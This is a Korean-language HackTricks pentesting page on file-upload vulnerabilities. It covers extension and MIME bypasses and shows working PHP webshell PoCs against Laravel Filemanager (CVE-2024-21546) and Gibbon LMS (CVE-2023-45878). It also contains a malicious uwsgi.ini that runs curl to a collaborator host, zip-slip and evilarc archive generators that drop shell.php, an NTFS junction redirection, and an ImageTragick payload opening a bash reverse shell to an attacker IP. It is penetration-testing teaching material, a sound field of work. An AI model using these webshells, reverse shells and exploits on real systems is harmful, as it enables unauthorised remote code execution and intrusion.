# 파일 업로드

{{#include ../../banners/hacktricks-training.md}}

## 파일 업로드 일반 방법론

다른 유용한 확장자:

- **PHP**: _.php_, _.php2_, _.php3_, ._php4_, ._php5_, ._php6_, ._php7_, .phps, ._pht_, ._phtm, .phtml_, ._pgif_, _.shtml, .htaccess, .phar, .inc, .hphp, .ctp, .module_
- **Working in PHPv8**: _.php_, _.php4_, _.php5_, .phtml_, .module_, .inc_, .hphp_, .ctp_
- **ASP**: _.asp, .aspx, .config, .ashx, .asmx, .aspq, .axd, .cshtm, .cshtml, .rem, .soap, .vbhtm, .vbhtml, .asa, .cer, .shtml_
- **Jsp:** _.jsp, .jspx, .jsw, .jsv, .jspf, .wss, .do, .action_
- **Coldfusion:** _.cfm, .cfml, .cfc, .dbm_
- **Flash**: _.swf_
- **Perl**: _.pl, .cgi_
- **Erlang Yaws Web Server**: _.yaws_

### 파일 확장자 검사 우회

1. 가능하다면, 위의 **확장자들을 확인**해보세요. 또한 **대문자**를 섞어 테스트하세요: _pHp, .pHP5, .PhAr ..._
2. _실행 가능 확장자 앞에 유효한 확장자를 추가해보세요 (위 확장자들로도 시도):_
- _file.png.php_
- _file.png.Php5_
3. 끝에 **특수 문자**를 추가해보세요. 모든 **ascii** 및 **Unicode** 문자를 Burp로 **bruteforce**할 수 있습니다. (_참고: 이전에 언급한 **확장자**들도 함께 시도할 수 있습니다_)
- _file.php%20_
- _file.php%0a_
- _file.php%00_
- _file.php%0d%0a_
- _file.php/_
- _file.php.\\_
- _file._
- _file.php...._
- _file.pHp5...._
4. 서버측의 확장자 파서를 **속이는** 기법(예: 확장자 **중복**, 확장자 사이에 **junk** 데이터나 **null** 바이트 삽입)으로 보호를 우회해보세요. _더 나은 페이로드를 위해 이전 확장자들도 활용할 수 있습니다._
- _file.png.php_
- _file.png.pHp5_
- _file.php#.png_
- _file.php%00.png_
- _file.php\x00.png_
- _file.php%0a.png_
- _file.php%0d%0a.png_
- _file.phpJunk123png_
5. 이전 검사에 **추가 확장자 레이어**를 더해보세요:
- _file.png.jpg.php_
- _file.php%00.png%00.jpg_
6. **실행 확장자(exec extension)를 유효한 확장자 앞에 두는** 방식으로 서버가 잘못 설정되었길 기대해보세요. (Apache의 일부 잘못된 설정에서는 **.php**가 포함된 어떤 이름이라도 실행될 수 있음)
- _ex: file.php.png_
7. **Windows의 NTFS alternate data stream (ADS)** 사용. 이 경우 금지된 확장자 뒤와 허용된 확장자 앞에 콜론 ":" 문자가 삽입됩니다. 결과적으로 서버에 **금지된 확장자만 가진 빈 파일**이 생성될 수 있습니다(예: "file.asax:.jpg"). 이 파일은 이후 short filename 등을 이용해 편집될 수 있습니다. "**::$data**” 패턴을 사용하면 비어있지 않은 파일을 만들 수도 있습니다. 따라서 이 패턴 뒤에 점을 추가하는 것도 추가 제한을 우회하는 데 유용할 수 있습니다(예: "file.asp::$data.").
8. 파일명 길이 제한을 깨보세요. 유효한 확장자가 잘려서 악성 PHP가 남을 수 있습니다. AAA<--SNIP-->AAA.php

```
# Linux maximum 255 bytes
/usr/share/metasploit-framework/tools/exploit/pattern_create.rb -l 255
Aa0Aa1Aa2Aa3Aa4Aa5Aa6Aa7Aa8Aa9Ab0Ab1Ab2Ab3Ab4Ab5Ab6Ab7Ab8Ab9Ac0Ac1Ac2Ac3Ac4Ac5Ac6Ac7Ac8Ac9Ad0Ad1Ad2Ad3Ad4Ad5Ad6Ad7Ad8Ad9Ae0Ae1Ae2Ae3Ae4Af5Af6Af7Af8Af9Ag0Ag1Ag2Ag3Ag4Ag5Ag6Ag7Ag8Ag9Ah0Ah1Ah2Ah3Ah4Ah5Ah6Ah7Ah8Ah9Ai0Ai1Ai2Ai3Ai4 # minus 4 here and adding .png
# Upload the file and check response how many characters it alllows. Let's say 236
python -c 'print "A" * 232'
AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA
# Make the payload
AAA<--SNIP 232 A-->AAA.php.png
```

#### UniSharp Laravel Filemanager pre-2.9.1 (.php. trailing dot) – CVE-2024-21546

일부 업로드 핸들러는 저장된 파일명에서 후행 점(dot)을 잘라내거나 정규화합니다. UniSharp의 Laravel Filemanager (unisharp/laravel-filemanager) 2.9.1 이전 버전에서는 다음으로 확장자 검증을 우회할 수 있습니다:

- 유효한 이미지 MIME과 magic header 사용(예: PNG의 `\x89PNG\r\n\x1a\n`).
- 업로드 파일명을 `shell.php.`처럼 PHP 확장자 뒤에 점을 붙여서 이름 지정.
- 서버가 후행 점을 제거하고 `shell.php`로 저장하면, 웹으로 제공되는 디렉토리에 있을 경우 실행됩니다(기본 public storage 예: `/storage/files/`).

Minimal PoC (Burp Repeater):
```http
POST /profile/avatar HTTP/1.1
Host: target
Content-Type: multipart/form-data; boundary=----WebKitFormBoundary

------WebKitFormBoundary
Content-Disposition: form-data; name="upload"; filename="0xdf.php."
Content-Type: image/png

\x89PNG\r\n\x1a\n<?php system($_GET['cmd']??'id'); ?>
------WebKitFormBoundary--
```
그런 다음 저장된 경로를 호출하세요 (Laravel + LFM에서 일반적):
```
GET /storage/files/0xdf.php?cmd=id
```
Mitigations:
- unisharp/laravel-filemanager를 ≥ 2.9.1로 업그레이드하세요.
- 엄격한 서버 측 allowlists를 적용하고 저장된 파일명을 다시 검증하세요.
- 업로드 파일은 실행 가능한 위치가 아닌 곳에서 제공하세요.

### 우회 Content-Type, Magic Number, Compression & Resizing

- Bypass **Content-Type** 검사를 우회하려면 **Content-Type** **header**의 **value**를 다음으로 설정하세요: _image/png_ , _text/plain , application/octet-stream_
1. Content-Type **wordlist**: [https://github.com/danielmiessler/SecLists/blob/master/Miscellaneous/Web/content-type.txt](https://github.com/danielmiessler/SecLists/blob/master/Miscellaneous/Web/content-type.txt)
- Bypass **magic number** 검사를 우회하려면 파일 맨 앞에 **실제 이미지의 바이트**를 추가하세요 (_file_ 명령을 혼동시킵니다). 또는 **metadata** 안에 쉘을 삽입하세요:\
`exiftool -Comment="<?php echo 'Command:'; if($_POST){system($_POST['cmd']);} __halt_compiler();" img.jpg`\
또는 페이로드를 이미지에 직접 삽입할 수도 있습니다:\
`echo '<?php system($_REQUEST['cmd']); ?>' >> img.png`
- If **compressions is being added to your image**, 예를 들어 [PHP-GD](https://www.php.net/manual/fr/book.image.php) 같은 표준 PHP 라이브러리를 사용하는 경우 이전 기법들은 유효하지 않을 수 있습니다. 하지만 **PLTE chunk** [**technique defined here**](https://www.synacktiv.com/publications/persistent-php-payloads-in-pngs-how-to-inject-php-code-in-an-image-and-keep-it-there.html)를 사용해 압축을 **견디는 텍스트**를 삽입할 수 있습니다.
- [**Github with the code**](https://github.com/synacktiv/astrolock/blob/main/payloads/generators/gen_plte_png.php)
- 웹 페이지가 예를 들어 PHP-GD 함수 `imagecopyresized` 또는 `imagecopyresampled`를 사용하여 이미지를 리사이징할 수도 있습니다. 그러나 **IDAT chunk** [**technique defined here**](https://www.synacktiv.com/publications/persistent-php-payloads-in-pngs-how-to-inject-php-code-in-an-image-and-keep-it-there.html)를 사용해 압축을 **견디는 텍스트**를 삽입할 수 있습니다.
- [**Github with the code**](https://github.com/synacktiv/astrolock/blob/main/payloads/generators/gen_idat_png.php)
- 이미지 리사이징을 견디는 페이로드를 만드는 또 다른 기법은 PHP-GD 함수 `thumbnailImage`를 사용하는 것입니다. 그러나 **tEXt chunk** [**technique defined here**](https://www.synacktiv.com/publications/persistent-php-payloads-in-pngs-how-to-inject-php-code-in-an-image-and-keep-it-there.html)를 사용해 압축을 **견디는 텍스트**를 삽입할 수 있습니다.
- [**Github with the code**](https://github.com/synacktiv/astrolock/blob/main/payloads/generators/gen_tEXt_png.php)

### 확인할 기타 트릭

- 이미 업로드된 파일의 이름을 **rename**(확장자 변경)할 수 있는 취약점을 찾아보세요.
- 백도어를 실행하기 위해 **Local File Inclusion** 취약점을 찾아보세요.
- **가능한 정보 노출**:
1. 같은 이름의 같은 파일을 **여러 번**(그리고 **동시에**) 업로드하세요.
2. 이미 존재하는 **파일**이나 **폴더**의 **이름**으로 파일을 업로드하세요.
3. 파일 이름을 **"." , "..", or "…"**로 업로드하기. 예를 들어, Apache의 **Windows**에서 애플리케이션이 업로드 파일을 "/www/uploads/" 디렉토리에 저장하면, "." 파일명은 "/www/" 디렉토리에 uploads”라는 파일을 생성합니다.
4. NTFS(Windows)에서 **"…:.jpg"**처럼 쉽게 삭제되지 않는 파일을 업로드하세요.
5. Windows에서 `|<>*?”` 같은 **유효하지 않은 문자**를 이름에 포함한 파일을 업로드하세요.
6. Windows에서 CON, PRN, AUX, NUL, COM1, COM2, COM3, COM4, COM5, COM6, COM7, COM8, COM9, LPT1, LPT2, LPT3, LPT4, LPT5, LPT6, LPT7, LPT8, and LPT9와 같은 **예약(금지)된 이름**을 사용해 파일을 업로드하세요.
- 피해자가 우연히 열었을 때 코드가 실행되는 실행 파일(.exe)이나 덜 의심스러운 .html 파일을 업로드해보세요.

### Special extension tricks

If you are trying to upload files to a **PHP server**, [take a look at the **.htaccess** trick to execute code](https://book.hacktricks.wiki/en/network-services-pentesting/pentesting-web/php-tricks-esp/index.html#code-execution).\
If you are trying to upload files to an **ASP server**, [take a look at the **.config** trick to execute code](../../network-services-pentesting/pentesting-web/iis-internet-information-services.md#execute-config-files).

`.phar` 파일은 Java의 `.jar`와 유사하지만 PHP용이며, **php 파일처럼 사용**할 수 있습니다(php로 실행하거나 스크립트에 포함하는 등).

`.inc` 확장자는 파일을 **import**하는 용도로만 사용되는 php 파일에 가끔 사용됩니다. 따라서 어떤 시점에서는 누군가가 **이 확장자를 실행 가능하도록 허용했을 수도 있습니다**.

## **Jetty RCE**

If you can upload a XML file into a Jetty server you can obtain [RCE because **new *.xml and *.war are automatically processed**](https://twitter.com/ptswarm/status/1555184661751648256/photo/1)**.** 따라서 다음 이미지에서 언급된 것처럼 XML 파일을 `$JETTY_BASE/webapps/`에 업로드하면 쉘을 얻을 수 있습니다!

![https://twitter.com/ptswarm/status/1555184661751648256/photo/1](<../../images/image (1047).png>)

## **uWSGI RCE**

For a detailed exploration of this vulnerability check the original research: [uWSGI RCE Exploitation](https://blog.doyensec.com/2023/02/28/new-vector-for-dirty-arbitrary-file-write-2-rce.html).

Remote Command Execution (RCE) 취약점은 `.ini` 구성 파일을 수정할 수 있는 능력이 있는 경우 uWSGI 서버에서 악용될 수 있습니다. uWSGI 구성 파일은 "magic" 변수, 플레이스홀더, 연산자를 포함하는 특정 문법을 사용합니다. 특히 '@' 연산자는 `@(filename)`로 사용되어 파일의 내용을 포함하도록 설계되었습니다. uWSGI에서 지원되는 여러 스킴 중 "exec" 스킴은 특히 강력하여 프로세스의 표준 출력에서 데이터를 읽을 수 있습니다. 이 기능은 `.ini` 구성 파일이 처리될 때 Remote Command Execution 또는 Arbitrary File Write/Read와 같은 악의적 목적에 악용될 수 있습니다.

다음은 다양한 스킴을 보여주는 악성 `uwsgi.ini` 파일의 예입니다:
```ini
[uwsgi]
; read from a symbol
foo = @(sym://uwsgi_funny_function)
; read from binary appended data
bar = @(data://[REDACTED])
; read from http
test = @(http://[REDACTED])
; read from a file descriptor
content = @(fd://[REDACTED])
; read from a process stdout
body = @(exec://whoami)
; curl to exfil via collaborator
extra = @(exec://curl http://collaborator-unique-host.oastify.com)
; call a function returning a char *
characters = @(call://uwsgi_func)
```
The execution of the payload occurs during the parsing of the configuration file. For the configuration to be activated and parsed, the uWSGI process must either be restarted (potentially after a crash or due to a Denial of Service attack) or the file must be set to auto-reload. The auto-reload feature, if enabled, reloads the file at specified intervals upon detecting changes.

설정 파일을 파싱하는 동안 payload가 실행됩니다. 설정이 활성화되어 파싱되려면 uWSGI 프로세스를 재시작해야 하며(크래시 후 또는 Denial of Service 공격으로 인해) 또는 파일이 auto-reload로 설정되어야 합니다. auto-reload 기능이 활성화된 경우 변경을 감지하면 지정된 간격으로 파일을 다시 로드합니다.

It's crucial to understand the lax nature of uWSGI's configuration file parsing. Specifically, the discussed payload can be inserted into a binary file (such as an image or PDF), further broadening the scope of potential exploitation.

uWSGI의 설정 파일 파싱이 느슨하다는 점을 이해하는 것이 중요합니다. 구체적으로, 여기서 언급한 payload는 이미지나 PDF 같은 바이너리 파일에 삽입될 수 있어 잠재적인 악용 범위를 더욱 넓힙니다.

### Gibbon LMS arbitrary file write to pre-auth RCE (CVE-2023-45878)

Unauthenticated endpoint in Gibbon LMS allows arbitrary file write inside the web root, leading to pre-auth RCE by dropping a PHP file. Vulnerable versions: up to and including 25.0.01.

Gibbon LMS의 인증되지 않은 endpoint가 웹 루트 내에 임의의 파일 쓰기를 허용하여 PHP 파일을 업로드함으로써 pre-auth RCE로 이어집니다. 취약한 버전: 25.0.01 까지(포함).

- Endpoint: `/Gibbon-LMS/modules/Rubrics/rubrics_visualise_saveAjax.php`
- Method: POST
- Required params:
- `img`: data-URI-like string: `[mime];[name],[base64]` (server ignores type/name, base64-decodes the tail)
- `path`: destination filename relative to Gibbon install dir (e.g., `poc.php` or `0xdf.php`)
- `gibbonPersonID`: any non-empty value is accepted (e.g., `0000000001`)

- 엔드포인트: `/Gibbon-LMS/modules/Rubrics/rubrics_visualise_saveAjax.php`
- 메서드: POST
- 필수 파라미터:
- `img`: data-URI와 유사한 문자열: `[mime];[name],[base64]` (서버는 type/name을 무시하고 꼬리 부분을 base64로 디코드함)
- `path`: Gibbon 설치 디렉토리 기준의 대상 파일명 (예: `poc.php` 또는 `0xdf.php`)
- `gibbonPersonID`: 비어있지 않은 값이면 어떤 값이든 허용됨 (예: `0000000001`)

Minimal PoC to write and read back a file:

파일을 쓰고 다시 읽기 위한 최소 PoC:
```bash
# Prepare test payload
printf '0xdf was here!' | base64
# => MHhkZiB3YXMgaGVyZSEK

# Write poc.php via unauth POST
curl http://target/Gibbon-LMS/modules/Rubrics/rubrics_visualise_saveAjax.php \
-d 'img=image/png;test,MHhkZiB3YXMgaGVyZSEK&path=poc.php&gibbonPersonID=0000000001'

# Verify write
curl http://target/Gibbon-LMS/poc.php
```
최소한의 webshell을 업로드하고 명령을 실행:
```bash
# '<?php system($_GET["cmd"]); ?>' base64
# PD9waHAgIHN5c3RlbSgkX0dFVFsiY21kIl0pOyA/Pg==

curl http://target/Gibbon-LMS/modules/Rubrics/rubrics_visualise_saveAjax.php \
-d 'img=image/png;foo,PD9waHAgIHN5c3RlbSgkX0dFVFsiY21kIl0pOyA/Pg==&path=shell.php&gibbonPersonID=0000000001'

curl 'http://target/Gibbon-LMS/shell.php?cmd=whoami'
```
참고:
- 핸들러는 `;` 와 `,` 로 분할한 뒤 `base64_decode($_POST["img"])` 를 수행하고, 확장자/타입을 검증하지 않은 채 바이트를 `$absolutePath . '/' . $_POST['path']` 에 씁니다.
- 결과적으로 이 코드는 웹 서비스 사용자 권한으로 실행됩니다 (예: XAMPP Apache on Windows).

이 버그에 대한 참조로는 usd HeroLab advisory와 NVD 항목이 있습니다. 아래의 References 섹션을 참조하세요.

## **wget File Upload/SSRF Trick**

어떤 경우에는 서버가 **`wget`** 을 사용해 **파일을 다운로드**하고 당신이 **URL** 을 **지정**할 수 있는 상황을 마주칠 수 있습니다. 이런 경우 코드가 다운로드된 파일의 확장자가 허용된 화이트리스트에 있는지 검사하여 허용된 파일만 다운로드되도록 할 수 있습니다. 그러나 **이 검사**는 우회될 수 있습니다.\
리눅스에서 파일명 최대 길이는 **255** 이지만, **wget** 은 파일명을 **236** 자로 잘라냅니다. 따라서 **"A"*232+".php"+".gif"** 라는 이름의 파일을 다운로드하면 이 파일명은 검사(예에서 **".gif"** 가 유효한 확장자이기 때문에)를 우회하지만 `wget` 은 파일명을 **"A"*232+".php"** 로 변경합니다.
```bash
#Create file and HTTP server
echo "SOMETHING" > $(python -c 'print("A"*(236-4)+".php"+".gif")')
python3 -m http.server 9080
```

```bash
#Download the file
wget 127.0.0.1:9080/$(python -c 'print("A"*(236-4)+".php"+".gif")')
The name is too long, 240 chars total.
Trying to shorten...
New name is AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA.php.
--2020-06-13 03:14:06--  http://127.0.0.1:9080/AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA.php.gif
Connecting to 127.0.0.1:9080... connected.
HTTP request sent, awaiting response... 200 OK
Length: 10 [image/gif]
Saving to: ‘AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA.php’

AAAAAAAAAAAAAAAAAAAAAAAAAAAAA 100%[===============================================>]      10  --.-KB/s    in 0s

2020-06-13 03:14:06 (1.96 MB/s) - ‘AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA.php’ saved [10/10]
```
Note that **another option** you may be thinking of to bypass this check is to make the **HTTP server redirect to a different file**, so the initial URL will bypass the check by then wget will download the redirected file with the new name. This **won't work** **unless** wget is being used with the **parameter** `--trust-server-names` because **wget will download the redirected page with the name of the file indicated in the original URL**.

### NTFS junctions (Windows)를 이용한 업로드 디렉터리 탈출

(이 공격은 Windows 머신에 대한 로컬 액세스가 필요합니다) 업로드가 Windows에서 사용자별 하위폴더(예: C:\Windows\Tasks\Uploads\<id>\)에 저장되고 해당 하위폴더의 생성/삭제를 제어할 수 있다면, 그 폴더를 민감한 위치(예: the webroot)를 가리키는 directory junction으로 교체할 수 있습니다. 이후 업로드된 파일은 대상 경로에 기록되며, 대상이 server‑side code를 해석하는 경우 코드 실행이 가능해집니다.

Example flow to redirect uploads into XAMPP webroot:
```cmd
:: 1) Upload once to learn/confirm your per-user folder name (e.g., md5 of form fields)
::    Observe it on disk: C:\Windows\Tasks\Uploads\33d81ad509ef34a2635903babb285882

:: 2) Remove the created folder and create a junction to webroot
rmdir C:\Windows\Tasks\Uploads\33d81ad509ef34a2635903babb285882
cmd /c mklink /J C:\Windows\Tasks\Uploads\33d81ad509ef34a2635903babb285882 C:\xampp\htdocs

:: 3) Re-upload your payload; it lands under C:\xampp\htdocs
::    Minimal PHP webshell for testing
::    <?php echo shell_exec($_REQUEST['cmd']); ?>

:: 4) Trigger
curl "http://TARGET/shell.php?cmd=whoami"
```
노트
- mklink /J creates an NTFS directory junction (reparse point). 웹 서버의 계정은 junction을 따라가야 하며 대상에 대한 쓰기 권한을 가져야 합니다.
- This redirects arbitrary file writes; 대상이 스크립트(PHP/ASP)를 실행하면 RCE가 됩니다.
- 방어: C:\Windows\Tasks 같은 위치 아래에서 공격자가 제어할 수 있는 writable upload roots를 허용하지 마세요; junction 생성 차단; 서버 측에서 확장자 검증; 업로드를 별도 볼륨에 저장하거나 deny‑execute ACL을 적용하세요.

## 도구

- [Upload Bypass](https://github.com/sAjibuu/Upload_Bypass) 는 Pentesters 및 Bug Hunters가 file upload 메커니즘을 테스트할 때 돕기 위해 설계된 강력한 도구입니다. 다양한 bug bounty 기법을 활용하여 취약점 식별 및 악용 과정을 단순화하고 웹 애플리케이션에 대한 철저한 평가를 보장합니다.

### snprintf 특이 동작으로 업로드 인덱스 손상시키기 (historical)

`snprintf()` 또는 유사한 함수를 사용해 단일 파일 업로드로부터 multi-file 배열을 구성하는 일부 레거시 업로드 핸들러는 `_FILES` 구조를 위조하도록 속일 수 있습니다. `snprintf()` 동작의 불일치와 잘림(truncation) 때문에 정교하게 조작된 단일 업로드가 서버 측에서 여러 인덱스화된 파일로 보일 수 있으며, 엄격한 형태를 가정하는 로직(예: multi-file 업로드로 처리하여 안전하지 않은 분기 진입)이 혼란을 겪게 됩니다. 오늘날에는 드물지만 이 “index corruption” 패턴은 가끔 CTFs와 오래된 코드베이스에서 재등장합니다.

## File upload에서 다른 취약점으로

- **filename**을 `../../../tmp/lol.png`로 설정하고 **path traversal**을 시도해보세요
- **filename**을 `sleep(10)-- -.jpg`로 설정하면 **SQL injection**이 가능할 수 있습니다
- **filename**을 `<svg onload=alert(document.domain)>`로 설정하면 XSS를 일으킬 수 있습니다
- **filename**을 `; sleep 10;`로 설정해 일부 command injection을 테스트해보세요 (more [command injections tricks here](../command-injection.md))
- [**XSS** in image (svg) file upload](../xss-cross-site-scripting/index.html#xss-uploading-files-svg)
- **JS** file **upload** + **XSS** = [**Service Workers** exploitation](../xss-cross-site-scripting/index.html#xss-abusing-service-workers)
- [**XXE in svg upload**](../xxe-xee-xml-external-entity.md#svg-file-upload)
- [**Open Redirect** via uploading svg file](../open-redirect.md#open-redirect-uploading-svg-files)
- Try **different svg payloads** from [**https://github.com/allanlw/svg-cheatsheet**](https://github.com/allanlw/svg-cheatsheet)
- [Famous **ImageTrick** vulnerability](https://mukarramkhalid.com/imagemagick-imagetragick-exploit/)
- 만약 웹 서버에 URL에서 이미지를 가져오도록 지시할 수 있다면 [SSRF](../ssrf-server-side-request-forgery/index.html)를 악용해볼 수 있습니다. 이 **image**가 어떤 **public** 사이트에 **saved**된다면, [https://iplogger.org/invisible/](https://iplogger.org/invisible/) 같은 URL을 지정하여 **모든 방문자의 정보**를 훔칠 수도 있습니다.
- [**XXE and CORS** bypass with PDF-Adobe upload](pdf-upload-xxe-and-cors-bypass.md)
- 특수 제작된 PDF로 XSS: [다음 페이지는 **PDF 데이터 주입으로 JS 실행을 얻는 방법**을 설명합니다](../xss-cross-site-scripting/pdf-injection.md). PDF 업로드가 가능하다면 주어진 지침에 따라 임의의 JS를 실행하는 PDF를 준비할 수 있습니다.
- 서버에 어떤 **antivirus**가 있는지 확인하려면 \[eicar]\([**https://secure.eicar.org/eicar.com.txt**](https://secure.eicar.org/eicar.com.txt)) 내용을 업로드해보세요
- 파일 업로드 시 **size limit**가 있는지 확인하세요

다음은 업로드로 달성할 수 있는 상위 10가지 항목입니다 (from [here](https://twitter.com/SalahHasoneh1/status/1281274120395685889)):

1. **ASP / ASPX / PHP5 / PHP / PHP3**: Webshell / RCE
2. **SVG**: Stored XSS / SSRF / XXE
3. **GIF**: Stored XSS / SSRF
4. **CSV**: CSV injection
5. **XML**: XXE
6. **AVI**: LFI / SSRF
7. **HTML / JS** : HTML injection / XSS / Open redirect
8. **PNG / JPEG**: Pixel flood attack (DoS)
9. **ZIP**: RCE via LFI / DoS
10. **PDF / PPTX**: SSRF / BLIND XXE

#### Burp Extension


{{#ref}}
https://github.com/portswigger/upload-scanner
{{#endref}}

## Magic Header Bytes

- **PNG**: `"\x89PNG\r\n\x1a\n\0\0\0\rIHDR\0\0\x03H\0\x s0\x03["`
- **JPG**: `"\xff\xd8\xff"`

다른 파일 유형은 [https://en.wikipedia.org/wiki/List_of_file_signatures](https://en.wikipedia.org/wiki/List_of_file_signatures)를 참조하세요.

## Zip/Tar 파일이 서버에서 자동으로 압축 해제되는 업로드

서버 내에서 압축 해제될 ZIP을 업로드할 수 있다면 다음 두 가지를 할 수 있습니다:

### Symlink

다른 파일로의 soft links가 포함된 링크를 업로드하면, 압축 해제된 파일에 접근할 때 연결된 파일들에 접근하게 됩니다:
```
ln -s ../../../index.php symindex.txt
zip --symlinks test.zip symindex.txt
tar -cvf test.tar symindex.txt
```
### 다른 폴더로 압축 해제

압축 해제 과정에서 디렉토리에 파일이 의도치 않게 생성되는 것은 심각한 문제입니다. 이러한 설정이 악성 파일 업로드를 통한 OS-level command execution을 방어할 수 있다고 처음에는 가정하더라도, ZIP archive format의 계층적 압축 지원과 directory traversal 기능은 악용될 수 있습니다. 이를 통해 공격자는 대상 애플리케이션의 압축 해제 기능을 조작하여 제한을 우회하고 보안 업로드 디렉토리에서 탈출할 수 있습니다.

이러한 파일을 제작하는 자동화된 exploit은 [**evilarc on GitHub**](https://github.com/ptoomey3/evilarc)에서 제공됩니다. 이 유틸리티는 다음과 같이 사용할 수 있습니다:
```python
# Listing available options
python2 evilarc.py -h
# Creating a malicious archive
python2 evilarc.py -o unix -d 5 -p /var/www/html/ rev.php
```
또한, **symlink trick with evilarc**도 옵션이다.

목표가 `/flag.txt` 같은 파일을 겨냥하는 것이라면, 시스템에 해당 파일을 가리키는 symlink를 생성해야 한다. 이렇게 하면 evilarc가 동작 중 오류가 발생하지 않도록 보장한다.

아래는 악성 zip 파일을 생성하는 데 사용되는 Python 코드 예시이다:
```python
#!/usr/bin/python
import zipfile
from io import BytesIO


def create_zip():
f = BytesIO()
z = zipfile.ZipFile(f, 'w', zipfile.ZIP_DEFLATED)
z.writestr('../../../../../var/www/html/webserver/shell.php', '<?php echo system($_REQUEST["cmd"]); ?>')
z.writestr('otherfile.xml', 'Content of the file')
z.close()
zip = open('poc.zip','wb')
zip.write(f.getvalue())
zip.close()

create_zip()
```
**압축 악용을 통한 file spraying**

자세한 내용은 **원문 포스트를 확인하세요**: [https://blog.silentsignal.eu/2014/01/31/file-upload-unzip/](https://blog.silentsignal.eu/2014/01/31/file-upload-unzip/)

1.  **Creating a PHP Shell**: 명령을 `$_REQUEST` 변수로 전달받아 실행하는 PHP 코드를 작성한다.

```php
<?php
if(isset($_REQUEST['cmd'])){
$cmd = ($_REQUEST['cmd']);
system($cmd);
}?>
```

2.  **File Spraying and Compressed File Creation**: 여러 파일을 생성하고 이 파일들을 포함하는 zip 아카이브를 만든다.

```bash
root@s2crew:/tmp# for i in `seq 1 10`;do FILE=$FILE"xxA"; cp simple-backdoor.php $FILE"cmd.php";done
root@s2crew:/tmp# zip cmd.zip xx*.php
```

3.  **Modification with a Hex Editor or vi**: zip 내부의 파일 이름을 vi 또는 Hex Editor로 변경하여 "xxA"를 "../"로 바꿔 상위 디렉터리로 이동시킨다.

```bash
:set modifiable
:%s/xxA/../g
:x!
```

## ImageTragic

이 콘텐츠를 이미지 확장자로 업로드하여 취약점을 악용한다 **(ImageMagick , 7.0.1-1)** (exploit에서 확인: [https://www.exploit-db.com/exploits/39767])
```
push graphic-context
viewbox 0 0 640 480
fill 'url(https://127.0.0.1/test.jpg"|bash -i >& /dev/tcp/attacker-ip/attacker-port 0>&1|touch "hello)'
pop graphic-context
```
## PNG에 PHP Shell 삽입

PNG 파일의 IDAT 청크에 PHP shell을 삽입하면 특정 이미지 처리 작업을 효과적으로 우회할 수 있습니다. PHP-GD의 `imagecopyresized`와 `imagecopyresampled` 함수는 각각 이미지 리사이징과 리샘플링에 흔히 사용되므로 이 문맥에서 특히 관련이 있습니다. 삽입된 PHP shell이 이러한 작업으로부터 영향을 받지 않고 남아 있을 수 있다는 점은 특정 사용 사례에서 중요한 장점입니다.

이 기술의 방법론과 잠재적 응용을 자세히 다룬 글은 다음 기사에서 확인할 수 있습니다: ["Encoding Web Shells in PNG IDAT chunks"](https://www.idontplaydarts.com/2012/06/encoding-web-shells-in-png-idat-chunks/). 이 자료는 프로세스와 그 함의를 포괄적으로 이해하는 데 도움이 됩니다.

More information in: [https://www.idontplaydarts.com/2012/06/encoding-web-shells-in-png-idat-chunks/](https://www.idontplaydarts.com/2012/06/encoding-web-shells-in-png-idat-chunks/)

## Polyglot 파일

Polyglot 파일은 사이버보안에서 독특한 도구로, 동시에 여러 파일 포맷으로 유효하게 존재할 수 있는 카멜레온과 같습니다. 흥미로운 예로는 GIF와 RAR 아카이브 모두로 동작하는 [GIFAR](https://en.wikipedia.org/wiki/Gifar)가 있습니다. 이런 파일은 이 조합에만 국한되지 않으며, GIF와 JS 또는 PPT와 JS 같은 조합도 가능합니다.

Polyglot의 핵심 유용성은 파일 유형을 기준으로 파일을 검사하는 보안 제약을 우회할 수 있다는 점입니다. 많은 애플리케이션에서는 잠재적으로 위험한 포맷(예: JS, PHP, Phar 파일)을 줄이기 위해 JPEG, GIF 또는 DOC 같은 특정 파일 타입만 업로드를 허용하는 경우가 흔합니다. 그러나 polyglot은 여러 파일 타입의 구조적 기준을 동시에 만족함으로써 이러한 제한을 은밀히 우회할 수 있습니다.

